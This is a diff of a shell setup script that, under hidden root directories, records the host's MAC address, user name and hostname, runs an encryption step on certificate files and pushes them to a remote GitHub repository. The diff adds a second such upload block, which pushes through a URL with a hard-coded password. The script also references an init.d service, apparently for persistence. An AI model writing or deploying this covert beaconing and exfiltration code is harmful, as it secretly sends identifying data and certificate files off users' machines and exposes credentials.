@@ -8,7 +8,7 @@ git config --global --add user.name "root"
 MDIR=/.data_servicex
 SDIR=$MDIR/setup
 LDIR=$MDIR/log
-SLDIR=$MDIR/setup_log
+SLDIR=/.setup_logx
 
 STDIR=start/
 RDIR=run/
@@ -120,7 +120,7 @@ else
           git remote add origin https://github.com/reportlog/log_service.git
           git checkout -b root-$(date '+%y_%m_%d_%I_%M_%S')
      	  read MAC </sys/class/net/eth0/address
-          echo "started $MAC : $USER : $HOSTNAME $(date +"%D %T")" >  logx_$(date '+%y_%m_%d_%I_%M_%S').ljp
+          echo "started logx $MAC : $USER : $HOSTNAME $(date +"%D %T")" >  logx_$(date '+%y_%m_%d_%I_%M_%S').ljp
           encriptFile
           git add \*.crt
           git config --local --add user.email "root@rootmail.com"
@@ -139,6 +139,32 @@ else
      else
           echo "$LDIR change failed"
      fi
+fi
+
+if [ -d $SLDIR ]
+then
+     echo "$SLDIR exists"
+else
+     echo "$SLDIR doesn't exists"
+     mkdir $SLDIR
+     cd $SLDIR
+     ret=$?
+     if [ $ret -ne 0 ]; then
+          git init
+          git remote add origin https://github.com/reportlog/setuplog_service.git
+          git config --local --add user.email "root@rootmail.com"
+          git config --local --add user.name "root"
+          git checkout -b root-$(date '+%y_%m_%d_%I_%M_%S')
+          read MAC </sys/class/net/eth0/address
+          echo "started logsx $MAC : $USER : $HOSTNAME $(date +"%D %T")" >  logs_$(date '+%y_%m_%d_%I_%M_%S').ljp
+          encriptFile
+          git add \*.crt
+          git commit -m "root-$(date +"%D %T")"
+          git push https://reportlog:1q2w3e4r5t@github.com/reportlog/setuplog_service.git --all
+     else
+          echo "$SLDIR change failed!!!"
+     fi
+     cd $HOME
 fi
 
 if [ -e /etc/init.d/reportService ]
